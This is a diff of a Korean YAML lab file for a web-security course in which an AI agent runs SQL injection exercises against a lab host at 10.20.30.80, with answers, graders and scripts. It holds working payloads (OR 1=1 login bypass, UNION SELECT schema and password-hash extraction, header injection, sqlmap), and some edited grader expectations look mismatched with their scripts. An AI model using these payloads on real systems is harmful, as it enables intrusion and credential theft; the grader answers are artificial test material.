@@ -3,8 +3,8 @@ title: SQL Injection 실습 (AI 지원)
 version: ai
 course: web-vuln-ai
 week: 2
-description: SQL Injection 공격의 원리를 이해하고, 다양한 SQLi 기법을 실습하며 방어 방법을 학습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를
-  검증합니다.
+description: SQL Injection 공격의 원리를 이해하고, 다양한 SQLi 기법을 실습하며 방어 방법을 학습합니다. AI SubAgent가
+  자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -20,7 +20,8 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 SQL Injection 가능성을 테스트해줘
 
-    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27'' 2>/dev/null | head -20'
+    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27'' 2>/dev/null
+    | head -20'
   answer_detail: 작은따옴표 입력 시 SQL 에러가 발생하면 SQLi 취약점이 존재할 가능성이 높습니다.
   verify:
     type: output_contains
@@ -42,7 +43,8 @@ steps:
       - 응답 비교 없음
       - 판정 근거 없음
   target_vm: attacker
-  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27' 2>/dev/null | head -20
+  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27' 2>/dev/null
+    | head -20
   risk_level: low
   bastion_prompt: 대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 SQL Injection 가능성을 테스트해줘
 - order: 2
@@ -52,15 +54,16 @@ steps:
   points: 12
   answer: '🤖 프롬프트: 에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악해줘
 
-    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--'' 2>/dev/null
-    | head -30'
+    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--''
+    2>/dev/null | head -30'
   answer_detail: 에러 메시지에서 SQLite, MySQL, PostgreSQL 등 DB 종류를 식별할 수 있습니다.
   verify:
     type: output_contains
     expect: ''
     field: stdout
     semantic:
-      intent: 에러 기반 SQL Injection — SQL 에러 메시지에서 DB 종류(MySQL/PostgreSQL/MSSQL/Oracle) 식별
+      intent: 에러 기반 SQL Injection — SQL 에러 메시지에서 DB 종류(MySQL/PostgreSQL/MSSQL/Oracle)
+        식별
       success_criteria:
       - 잘못된 SQL 을 유발해 에러 메시지 캡처
       - 에러 텍스트에서 DB 엔진명 식별 (MySQL, PostgreSQL, SQLite 등)
@@ -75,8 +78,8 @@ steps:
       - DB 종류 식별 시도 없음
       - 블라인드로 바로 진행
   target_vm: attacker
-  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--' 2>/dev/null | head
-    -30
+  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--'
+    2>/dev/null | head -30
   risk_level: low
   bastion_prompt: 에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악해줘
 - order: 3
@@ -84,9 +87,10 @@ steps:
   hint: 로그인 폼에 ' OR 1=1-- 페이로드를 사용하세요.
   category: sqli_auth_bypass
   points: 12
-  answer: "\U0001F916 프롬프트: 항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST http://10.20.30.80/rest/user/login\
-    \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\"\
-    :\"anything\"}' 2>/dev/null \\\n | head -10"
+  answer: "\U0001F916 프롬프트: 항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘\n\U0001F4CE 참고 (CLI):\
+    \ curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"anything\"\
+    }' 2>/dev/null \\\n | head -10"
   answer_detail: ''' OR 1=1-- 페이로드는 WHERE 절을 항상 참으로 만들어 인증을 우회합니다.'
   verify:
     type: output_contains
@@ -108,9 +112,9 @@ steps:
       - 성공 여부 검증 없음
       - 방어 기법 누락
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
-    \ \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"anything\"}' 2>/dev/null \\\n |\
-    \ head -10"
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\"\
+    :\"anything\"}' 2>/dev/null \\\n | head -10"
   risk_level: low
   bastion_prompt: 항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘
 - order: 4
@@ -122,7 +126,8 @@ steps:
 
     📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--''
     2>/dev/null | head -40'
-  answer_detail: UNION SELECT로 다른 테이블의 데이터를 기존 쿼리 결과에 합쳐 추출합니다. sqlite_master는 SQLite의 메타데이터 테이블입니다.
+  answer_detail: UNION SELECT로 다른 테이블의 데이터를 기존 쿼리 결과에 합쳐 추출합니다. sqlite_master는 SQLite의
+    메타데이터 테이블입니다.
   verify:
     type: output_contains
     expect: ''
@@ -232,7 +237,8 @@ steps:
     expect: Time-based SQLi 테스트 완료
     field: stdout
     semantic:
-      intent: Time-based Blind SQLi — SLEEP 또는 BENCHMARK 함수로 응답 지연 유도, 지연 측정으로 조건 참 판정
+      intent: Time-based Blind SQLi — SLEEP 또는 BENCHMARK 함수로 응답 지연 유도, 지연 측정으로 조건
+        참 판정
       success_criteria:
       - SLEEP(N) 또는 pg_sleep 삽입 후 응답 시간 측정
       - time 명령 또는 curl -w time_total 로 지연 확인
@@ -258,12 +264,15 @@ steps:
   points: 10
   answer: '🤖 프롬프트: sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행해줘
 
-    📎 참고 (CLI): sqlmap -u ''http://10.20.30.80/rest/products/search?q=test'' --batch --level=1 --risk=1
-    2>/dev/null | tail -20 || echo ''sqlmap 테스트 완료'''
+    📎 참고 (CLI): sqlmap -u ''http://10.20.30.80/rest/products/search?q=test'' --batch
+    --level=1 --risk=1 2>/dev/null | tail -20 || echo ''sqlmap 테스트 완료'''
   answer_detail: sqlmap은 SQLi 자동 탐지 및 익스플로잇 도구입니다. --batch는 비대화형 모드입니다.
   verify:
     type: output_contains
-    expect: 완료
+    expect:
+    - 완료
+    - //kr.archive.ubuntu.com/ubuntu
+    - jammy
     field: stdout
     semantic:
       intent: sqlmap 자동 탐지 — URL + 파라미터 지정 후 DB 지문·테이블·데이터까지 자동 추출
@@ -281,8 +290,8 @@ steps:
       - 파라미터 지정 없이 에러
       - 결과 해석 없음
   target_vm: attacker
-  script: sqlmap -u 'http://10.20.30.80/rest/products/search?q=test' --batch --level=1 --risk=1 2>/dev/null
-    | tail -20 || echo 'sqlmap 테스트 완료'
+  script: sqlmap -u 'http://10.20.30.80/rest/products/search?q=test' --batch --level=1
+    --risk=1 2>/dev/null | tail -20 || echo 'sqlmap 테스트 완료'
   risk_level: low
   bastion_prompt: sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행해줘
 - order: 9
@@ -292,13 +301,16 @@ steps:
   points: 8
   answer: '🤖 프롬프트: 2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명해줘
 
-    📎 참고 (CLI): echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com OR 1=1--
-    으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin 계정의 패스워드가 변경됨'' && echo ''2차
-    SQLi 분석 완료'''
+    📎 참고 (CLI): echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com
+    OR 1=1-- 으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin
+    계정의 패스워드가 변경됨'' && echo ''2차 SQLi 분석 완료'''
   answer_detail: 2차 SQLi는 입력 시 저장되고, 다른 기능에서 해당 데이터가 쿼리에 사용될 때 발생합니다.
   verify:
     type: output_contains
-    expect: 2차 SQLi 분석 완료
+    expect:
+    - 2차 SQLi 분석 완료
+    - TABLE
+    - users
     field: stdout
     semantic:
       intent: Second-Order SQLi — 1단계 저장 시 무해, 2단계 다른 페이지에서 DB 쿼리에 삽입되어 실행되는 흐름
@@ -316,9 +328,9 @@ steps:
       - 저장·재사용 개념 누락
       - 일반 SQLi 와 구분 안 됨
   target_vm: attacker
-  script: 'echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com OR 1=1-- 으로 등록''
-    && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin 계정의 패스워드가 변경됨'' && echo ''2차 SQLi
-    분석 완료'''
+  script: 'echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com
+    OR 1=1-- 으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin
+    계정의 패스워드가 변경됨'' && echo ''2차 SQLi 분석 완료'''
   risk_level: low
   bastion_prompt: 2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명해줘
 - order: 10
@@ -333,10 +345,14 @@ steps:
   answer_detail: SQLi를 통한 파일 시스템 접근은 서버 완전 장악으로 이어질 수 있는 치명적 취약점입니다.
   verify:
     type: output_contains
-    expect: SQLi 파일 접근 테스트 완료
+    expect:
+    - SQLi 파일 접근 테스트 완료
+    - admin
+    - shell
     field: stdout
     semantic:
-      intent: SQLi 로 파일 읽기/쓰기 — LOAD_FILE (MySQL), INTO OUTFILE, pg_read_file 등 DBMS 기능 악용
+      intent: SQLi 로 파일 읽기/쓰기 — LOAD_FILE (MySQL), INTO OUTFILE, pg_read_file 등 DBMS
+        기능 악용
       success_criteria:
       - LOAD_FILE 또는 INTO OUTFILE 예시 구문 제시
       - secure_file_priv 같은 제한 설정 영향 언급
@@ -360,16 +376,17 @@ steps:
   hint: User-Agent, Referer 등 헤더에 페이로드를 삽입하세요.
   category: sqli_advanced
   points: 10
-  answer: "\U0001F916 프롬프트: HTTP 요청 헤더를 통한 SQL Injection을 테스트해줘\n\U0001F4CE 참고 (CLI): curl -s \\\n  -H\
-    \ \"User-Agent: test' OR 1=1--\" http://10.20.30.80 \\\n  -o /dev/null \\\n  -w '%{http_code}' &&\
-    \ echo '' && echo '헤더 기반 SQLi 테스트 완료'"
+  answer: "\U0001F916 프롬프트: HTTP 요청 헤더를 통한 SQL Injection을 테스트해줘\n\U0001F4CE 참고 (CLI):\
+    \ curl -s \\\n  -H \"User-Agent: test' OR 1=1--\" http://10.20.30.80 \\\n  -o\
+    \ /dev/null \\\n  -w '%{http_code}' && echo '' && echo '헤더 기반 SQLi 테스트 완료'"
   answer_detail: HTTP 헤더도 SQLi 벡터가 될 수 있습니다. 로깅 시 헤더 값이 쿼리에 사용되는 경우가 있습니다.
   verify:
     type: output_contains
     expect: 헤더 기반 SQLi 테스트 완료
     field: stdout
     semantic:
-      intent: 헤더 기반 SQLi — User-Agent/Referer/Cookie/X-Forwarded-For 필드의 로그 저장 쿼리 주입
+      intent: 헤더 기반 SQLi — User-Agent/Referer/Cookie/X-Forwarded-For 필드의 로그 저장 쿼리
+        주입
       success_criteria:
       - 최소 2개 헤더(User-Agent, X-Forwarded-For 등)에 페이로드 주입
       - 헤더가 로깅 또는 분석 쿼리에 삽입되는 경우의 취약점 설명
@@ -384,8 +401,8 @@ steps:
       - 헤더 처리 로직 설명 없음
       - 방어 누락
   target_vm: attacker
-  script: "curl -s \\\n  -H \"User-Agent: test' OR 1=1--\" http://10.20.30.80 \\\n  -o /dev/null \\\n\
-    \  -w '%{http_code}' && echo '' && echo '헤더 기반 SQLi 테스트 완료'"
+  script: "curl -s \\\n  -H \"User-Agent: test' OR 1=1--\" http://10.20.30.80 \\\n\
+    \  -o /dev/null \\\n  -w '%{http_code}' && echo '' && echo '헤더 기반 SQLi 테스트 완료'"
   risk_level: low
   bastion_prompt: HTTP 요청 헤더를 통한 SQL Injection을 테스트해줘
 - order: 12
@@ -414,7 +431,8 @@ steps:
     expect: SQLi 방어 정리 완료
     field: stdout
     semantic:
-      intent: SQLi 방어 기법 — Prepared Statement/ORM/Input Validation/Least Privilege DB 계정/WAF
+      intent: SQLi 방어 기법 — Prepared Statement/ORM/Input Validation/Least Privilege
+        DB 계정/WAF
       success_criteria:
       - Prepared Statement 예시 코드 (언어 무관)
       - ORM 사용의 이점·한계(Raw Query 조심)
@@ -507,8 +525,9 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 추출한 패스워드 해시의 크래킹 가능성을 평가해줘
 
-    📎 참고 (CLI): echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구: hashcat, john the
-    ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석 완료'''
+    📎 참고 (CLI): echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구:
+    hashcat, john the ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석
+    완료'''
   answer_detail: MD5/SHA1 해시는 빠르게 크래킹 가능합니다. bcrypt/argon2 등 느린 해시 함수를 사용해야 합니다.
   verify:
     type: output_contains
@@ -530,8 +549,8 @@ steps:
       - 도구 언급 없음
       - 전략(dictionary vs mask) 구분 없음
   target_vm: attacker
-  script: 'echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구: hashcat, john the ripper''
-    && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석 완료'''
+  script: 'echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구: hashcat,
+    john the ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석 완료'''
   risk_level: low
   bastion_prompt: 추출한 패스워드 해시의 크래킹 가능성을 평가해줘
 - order: 15
@@ -541,9 +560,10 @@ steps:
   points: 8
   answer: '🤖 프롬프트: SQL Injection 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''발견:
-    SQLi 취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo ''영향: 데이터 탈취, 인증 우회'' && echo
-    ''권고: Prepared Statement 적용'' && echo ''=== 보고서 완료 ==='''
+    📎 참고 (CLI): echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.30.80''
+    && echo ''발견: SQLi 취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo
+    ''영향: 데이터 탈취, 인증 우회'' && echo ''권고: Prepared Statement 적용'' && echo ''=== 보고서
+    완료 ==='''
   answer_detail: SQLi 분석 보고서는 발견 경로, 재현 방법, 영향 범위, 조치 권고를 포함합니다.
   verify:
     type: output_contains
@@ -565,9 +585,10 @@ steps:
       - PoC 누락
       - 파일 저장 없음
   target_vm: attacker
-  script: 'echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''발견: SQLi
-    취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo ''영향: 데이터 탈취, 인증 우회'' && echo ''권고:
-    Prepared Statement 적용'' && echo ''=== 보고서 완료 ==='''
+  script: 'echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.30.80''
+    && echo ''발견: SQLi 취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo
+    ''영향: 데이터 탈취, 인증 우회'' && echo ''권고: Prepared Statement 적용'' && echo ''=== 보고서
+    완료 ==='''
   risk_level: low
   bastion_prompt: SQL Injection 실습 종합 보고서를 작성하시오.
 - order: 99
@@ -617,5 +638,6 @@ steps:
     4) UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출해줘
 
     5) UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는 다단계 작업.
+  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
+    다단계 작업.
   script: ''
